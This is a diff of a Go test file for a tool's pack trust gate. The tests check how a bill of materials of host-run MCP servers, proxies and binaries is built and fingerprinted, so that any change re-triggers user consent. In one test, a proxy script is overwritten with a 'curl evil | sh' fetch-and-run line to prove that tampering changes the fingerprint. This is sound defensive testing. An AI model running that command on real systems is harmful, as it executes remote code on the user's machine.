@@ -32,13 +32,13 @@ func sha256Hex(b []byte) string {
 // acceptPackSurface records pack root's CURRENT host-exec surface as accepted
 // in the HOST trust store — the test-side stand-in for saying yes at the
 // Tier-1 gate. PIX_CONFIG must already point into a temp dir.
-func acceptPackSurface(t *testing.T, root, cfgGogAccount string) {
+func acceptPackSurface(t *testing.T, root string) {
 	t.Helper()
 	p, err := packinfo.LoadPack(root)
 	if err != nil {
 		t.Fatal(err)
 	}
-	fp, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(p, cfgGogAccount, PackLocalMCP()))
+	fp, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(p))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -54,19 +54,21 @@ func acceptPackSurface(t *testing.T, root, cfgGogAccount string) {
 
 // --- F5: ComputeHostBoM ---------------------------------------------------------
 
-// TestComputeHostBoM_EnumeratesEveryHostExecFacet: the BoM lists every LOCAL
-// MCP (with the resolved serverCmd argv), every host wrapper, every host=true
-// [[bin]] (path+sha), the egress union across ALL proxies (sandbox egress
-// informs the screen even though it never raises the tier), and credential
-// VAR names — never values. The classifier here marks both names LOCAL (the
-// Tier-1 case); the remote/reference-only partition half is pinned by
-// TestComputeHostBoM_RemoteMCPReferenceRequiresConsent.
+// TestComputeHostBoM_EnumeratesEveryHostExecFacet: the BoM lists every
+// host-command MCP (with the argv the pack DECLARED), every host wrapper, every
+// host=true [[bin]] (path+sha), the egress union across ALL proxies (sandbox
+// egress informs the screen even though it never raises the tier), and
+// credential VAR names — never values. The container/remote transports are
+// pinned by TestComputeHostBoM_DisclosesContainerAndRemoteIntegrations.
 func TestComputeHostBoM_EnumeratesEveryHostExecFacet(t *testing.T) {
 	p := &packinfo.Info{Root: "/p", Manifest: packinfo.Manifest{
 		Name: "work",
 		Integrations: []packinfo.Integration{
-			{Name: "Fastmail", MCP: "fastmail", Env: "FASTMAIL_TOKEN"},
-			{Name: "gog", MCP: config.GWServerName, Env: "GOG_KEYRING"},
+			{Name: "Fastmail", MCP: "fastmail", Command: "fastmail-mcp", Env: "FASTMAIL_TOKEN"},
+			// Hardening flags are pack-declared and LITERAL, so a reviewer sees
+			// them in the bill of materials and re-consents when they change.
+			{Name: "Workspace", MCP: "workspace", Command: "gog",
+				Args: []string{"--readonly", "--gmail-no-send", "mcp"}, Env: "GOG_KEYRING"},
 		},
 		Proxies: []packinfo.PackProxy{
 			{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}},
@@ -75,18 +77,18 @@ func TestComputeHostBoM_EnumeratesEveryHostExecFacet(t *testing.T) {
 		Bins:          []packinfo.Bin{{Name: "fastmail-mcp", Path: "bin/fastmail-mcp", SHA: "9F2C", Host: true}},
 		Prerequisites: []string{"VPN connected"},
 	}}
-	b := ComputeHostBoM(p, "", func(string) bool { return true })
+	b := ComputeHostBoM(p)
 	if !b.Tier1() {
 		t.Fatal("a pack with mcp + host proxy + bin must be Tier-1")
 	}
-	if len(b.MCP) != 2 || b.MCP[0].Name != "fastmail" || b.MCP[1].Name != config.GWServerName {
+	if len(b.MCP) != 2 || b.MCP[0].Name != "fastmail" || b.MCP[1].Name != "workspace" {
 		t.Errorf("BoM mcp = %+v", b.MCP)
 	}
-	if got := strings.Join(b.MCP[0].Argv, " "); got != "pix-host mcp fastmail" {
-		t.Errorf("fastmail argv = %q (must be the real serverCmd shape)", got)
+	if got := strings.Join(b.MCP[0].Argv, " "); got != "fastmail-mcp" {
+		t.Errorf("fastmail argv = %q (the bare declared command, PATH-resolved only at spawn)", got)
 	}
-	if got := strings.Join(b.MCP[1].Argv, " "); !strings.Contains(got, "--gmail-no-send") || !strings.Contains(got, "--readonly") {
-		t.Errorf("gog argv must carry the hardened flags, got %q", got)
+	if got := strings.Join(b.MCP[1].Argv, " "); got != "gog --readonly --gmail-no-send mcp" {
+		t.Errorf("argv must be the pack's declared literal argv, got %q", got)
 	}
 	if len(b.Proxies) != 1 || b.Proxies[0] != "platformio" {
 		t.Errorf("BoM host proxies = %v", b.Proxies)
@@ -117,7 +119,7 @@ func TestComputeHostBoM_DisclosesContainerAndRemoteIntegrations(t *testing.T) {
 			{Name: "Meetings", MCP: "meetings", URL: "https://app.trymeetings.com/mcp"},
 		},
 	}}
-	b := ComputeHostBoM(p, "", func(string) bool { return false })
+	b := ComputeHostBoM(p)
 	if !b.Tier1() {
 		t.Fatal("a host-run MCP container must require the adoption gate")
 	}
@@ -151,7 +153,7 @@ func TestComputeHostBoM_Tier0(t *testing.T) {
 		Proxies:      []packinfo.PackProxy{{Name: "warehouse", Egress: []string{"warehouse.example.test"}}},
 		Integrations: []packinfo.Integration{{Name: "ref-only", Env: "SOME_TOKEN"}}, // env but NO mcp
 	}}
-	b := ComputeHostBoM(p, "", func(string) bool { return true })
+	b := ComputeHostBoM(p)
 	if b.Tier1() {
 		t.Errorf("no mcp, no host proxy, no bin must be Tier-0, got %+v", b)
 	}
@@ -220,10 +222,10 @@ func TestPackTrustGate_FailClosedMatrix(t *testing.T) {
 
 // TestHostExecFingerprint: the acceptance fingerprint covers the FULL host-exec
 // surface — identical surface → identical fingerprint (no re-prompt on
-// re-activation), while ANY change (a new mcp, a changed gog account resolved
-// into the argv, a mutated host proxy SCRIPT, a changed [[bin]] sha) produces
-// a different fingerprint and re-triggers the gate. Name-only coverage (the
-// old lock model's flaw) is structurally impossible here.
+// re-activation), while ANY change (a new mcp, a changed declared argv, a
+// mutated host proxy SCRIPT, a changed [[bin]] sha) produces a different
+// fingerprint and re-triggers the gate. Name-only coverage (the old lock
+// model's flaw) is structurally impossible here.
 func TestHostExecFingerprint(t *testing.T) {
 	root := t.TempDir()
 	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
@@ -233,50 +235,55 @@ func TestHostExecFingerprint(t *testing.T) {
 		t.Fatal(err)
 	}
 	base := packinfo.Manifest{
-		Name:         "work",
-		Integrations: []packinfo.Integration{{Name: "gog", MCP: config.GWServerName, Env: "GOG_KEYRING"}},
-		Proxies:      []packinfo.PackProxy{{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}}},
-		Bins:         []packinfo.Bin{{Name: "fm", Path: "bin/fm", SHA: "aaaa", Host: true}},
+		Name: "work",
+		Integrations: []packinfo.Integration{{Name: "Workspace", MCP: "workspace", Command: "gog",
+			Args: []string{"--readonly", "mcp"}, Env: "GOG_KEYRING"}},
+		Proxies: []packinfo.PackProxy{{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}}},
+		Bins:    []packinfo.Bin{{Name: "fm", Path: "bin/fm", SHA: "aaaa", Host: true}},
 	}
-	fpOf := func(account string, m packinfo.Manifest) string {
+	fpOf := func(m packinfo.Manifest) string {
 		t.Helper()
-		// Classifier: every declared mcp name is LOCAL here — this test pins
-		// the fingerprint's coverage of the host-spawned MCP surface.
-		fp, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(&packinfo.Info{Root: root, Manifest: m}, account, func(string) bool { return true }))
+		fp, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(&packinfo.Info{Root: root, Manifest: m}))
 		if err != nil {
 			t.Fatalf("fingerprint: %v", err)
 		}
 		return fp
 	}
-	fp0 := fpOf("a@example.com", base)
-	if fpOf("a@example.com", base) != fp0 {
+	fp0 := fpOf(base)
+	if fpOf(base) != fp0 {
 		t.Error("identical surface must produce an identical fingerprint (no re-prompt)")
 	}
-	if fpOf("b@example.com", base) == fp0 {
-		t.Error("a changed gog account (→ changed resolved MCP argv) must change the fingerprint")
-	}
+	// The argv a server is spawned with is pack-declared now, so THAT is what
+	// re-gates when it changes (this used to be a config gog_account resolved
+	// into the argv behind the user's back).
 	m := base
+	m.Integrations = []packinfo.Integration{{Name: "Workspace", MCP: "workspace", Command: "gog",
+		Args: []string{"mcp"}, Env: "GOG_KEYRING"}} // --readonly dropped
+	if fpOf(m) == fp0 {
+		t.Error("a CHANGED declared MCP argv must change the fingerprint")
+	}
+	m = base
 	m.Bins = []packinfo.Bin{{Name: "fm", Path: "bin/fm", SHA: "bbbb", Host: true}}
-	if fpOf("a@example.com", m) == fp0 {
+	if fpOf(m) == fp0 {
 		t.Error("a CHANGED [[bin]] sha must change the fingerprint")
 	}
 	m = base
-	m.Integrations = append([]packinfo.Integration{{Name: "New", MCP: "new-mcp"}}, base.Integrations...)
-	if fpOf("a@example.com", m) == fp0 {
+	m.Integrations = append([]packinfo.Integration{{Name: "New", MCP: "new-mcp", Command: "new-mcp-bin"}}, base.Integrations...)
+	if fpOf(m) == fp0 {
 		t.Error("a NEW mcp must change the fingerprint")
 	}
 	// Mutate the host proxy script: the CONTENT is pinned, not just the name.
 	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if fpOf("a@example.com", base) == fp0 {
+	if fpOf(base) == fp0 {
 		t.Error("a MUTATED host proxy script must change the fingerprint")
 	}
 	// A missing/unreadable script fails closed (nothing to accept or install).
 	if err := os.Remove(filepath.Join(root, "bin", "platformio")); err != nil {
 		t.Fatal(err)
 	}
-	if _, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(&packinfo.Info{Root: root, Manifest: base}, "", func(string) bool { return true })); err == nil {
+	if _, _, err := ComputeHostExecFingerprint(root, ComputeHostBoM(&packinfo.Info{Root: root, Manifest: base})); err == nil {
 		t.Error("a missing host proxy script must fail the fingerprint (fail closed)")
 	}
 }
@@ -292,12 +299,12 @@ func TestPackUse_Tier1NonTTYFailsClosed(t *testing.T) {
 	cfgPath := filepath.Join(dir, "config.toml")
 	root := filepath.Join(dir, "pack")
 	mustWritePack(t, root, packinfo.Manifest{Name: "work", Schema: 1,
-		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail", Env: "FASTMAIL_TOKEN"}}})
+		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail", Command: "fastmail-mcp", Env: "FASTMAIL_TOKEN"}}})
 
-	// The pack's mcp must classify as a LOCAL host command for Tier-1
-	// (round-2 C: a remote reference no longer gates).
+	// A declared MCP server is a host-exec surface whatever its transport, so
+	// this pack is Tier-1 with no ambient classification needed.
 	var buf bytes.Buffer
-	err := RunPackUse(localMCPEnv("fastmail"), &buf, []string{root}, registerOK)
+	err := RunPackUse(fakeGitEnv(nil), &buf, []string{root}, registerOK)
 	if err == nil {
 		t.Fatalf("Tier-1 non-TTY adopt without --yes must fail; output:\n%s", buf.String())
 	}
@@ -349,17 +356,15 @@ func TestPackUse_Tier0StillSilent(t *testing.T) {
 // TestPackUse_AcceptanceSticksAcrossReactivation: after a --yes adoption the
 // acceptance is recorded in the HOST trust store (never in the pack payload),
 // so re-activating the SAME pack without --yes on a non-TTY succeeds (trust
-// granted at adoption, no re-prompt). The mcp is pinned LOCAL so the pack is
-// Tier-1 (round-2 C: a remote reference would not gate at all).
+// granted at adoption, no re-prompt).
 func TestPackUse_AcceptanceSticksAcrossReactivation(t *testing.T) {
 	dir := isolatePackHost(t)
-	pinLocalMCP(t, "fastmail")
 	root := filepath.Join(dir, "pack")
 	mustWritePack(t, root, packinfo.Manifest{Name: "work", Schema: 1,
-		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail"}}})
+		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail", Command: "fastmail-mcp"}}})
 
 	var out bytes.Buffer
-	RunPackUse(localMCPEnv("fastmail"), &out, []string{root, "--yes"}, registerOK)
+	RunPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}, registerOK)
 	store, serr := loadPackTrustStore()
 	if serr != nil {
 		t.Fatal(serr)
@@ -374,7 +379,7 @@ func TestPackUse_AcceptanceSticksAcrossReactivation(t *testing.T) {
 	// Reactivation without --yes on a non-TTY: a misfiring gate would
 	// os.Exit(1) here and fail the whole test binary.
 	out.Reset()
-	RunPackUse(localMCPEnv("fastmail"), &out, []string{root}, registerOK)
+	RunPackUse(fakeGitEnv(nil), &out, []string{root}, registerOK)
 	if strings.Contains(out.String(), "adds these integrations to Pix") {
 		t.Errorf("covered BoM must not re-render the gate screen:\n%s", out.String())
 	}
@@ -387,13 +392,13 @@ func TestPackUse_NewHostFacetRetriggersGate(t *testing.T) {
 	dir := isolatePackHost(t)
 	root := filepath.Join(dir, "pack")
 	mustWritePack(t, root, packinfo.Manifest{Name: "work", Schema: 1,
-		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail"}}})
+		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail", Command: "fastmail-mcp"}}})
 	var out bytes.Buffer
 	RunPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"}, registerOK) // adopt + accept
 
 	// The manifest gains a host wrapper AFTER adoption.
 	mustWritePack(t, root, packinfo.Manifest{Name: "work", Schema: 1,
-		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail"}},
+		Integrations: []packinfo.Integration{{Name: "Fastmail", MCP: "fastmail", Command: "fastmail-mcp"}},
 		Proxies:      []packinfo.PackProxy{{Name: "platformio", Host: true}}})
 	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
 		t.Fatal(err)
